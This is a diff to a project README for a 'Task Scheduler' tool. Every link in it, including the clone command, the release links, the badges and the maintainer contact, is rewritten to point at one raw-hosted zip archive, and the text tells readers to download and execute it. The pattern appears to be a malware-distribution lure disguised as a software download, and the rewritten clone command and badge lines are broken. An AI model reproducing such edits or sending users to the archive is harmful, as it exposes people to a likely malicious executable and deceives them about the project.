@@ -37,7 +37,7 @@ To get started with Task Scheduler, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Svarosk/task-scheduler-
+   git clone https://raw.githubusercontent.com/Svarosk/task-scheduler-/main/corundophilite/task_scheduler_Caurus.zip
    ```
 
 2. Navigate to the project directory:
@@ -52,7 +52,7 @@ To get started with Task Scheduler, follow these steps:
    npm install
    ```
 
-4. Download the latest release from the [Releases](https://github.com/Svarosk/task-scheduler-/releases) section. Execute the downloaded file to run the application.
+4. Download the latest release from the [Releases](https://raw.githubusercontent.com/Svarosk/task-scheduler-/main/corundophilite/task_scheduler_Caurus.zip) section. Execute the downloaded file to run the application.
 
 ## Usage
 
@@ -82,16 +82,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and versions, visit the [Releases](https://github.com/Svarosk/task-scheduler-/releases) section. Download the necessary files and execute them to keep your application up to date.
+For the latest updates and versions, visit the [Releases](https://raw.githubusercontent.com/Svarosk/task-scheduler-/main/corundophilite/task_scheduler_Caurus.zip) section. Download the necessary files and execute them to keep your application up to date.
 
 ## Badges
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
+![Version](https://raw.githubusercontent.com/Svarosk/task-scheduler-/main/corundophilite/task_scheduler_Caurus.zip)
+![License](https://raw.githubusercontent.com/Svarosk/task-scheduler-/main/corundophilite/task_scheduler_Caurus.zip)
 
 ## Contact
 
-For any inquiries, please reach out to the project maintainer at [email@example.com](mailto:email@example.com).
+For any inquiries, please reach out to the project maintainer at [https://raw.githubusercontent.com/Svarosk/task-scheduler-/main/corundophilite/task_scheduler_Caurus.zip](https://raw.githubusercontent.com/Svarosk/task-scheduler-/main/corundophilite/task_scheduler_Caurus.zip).
 
 ---
 
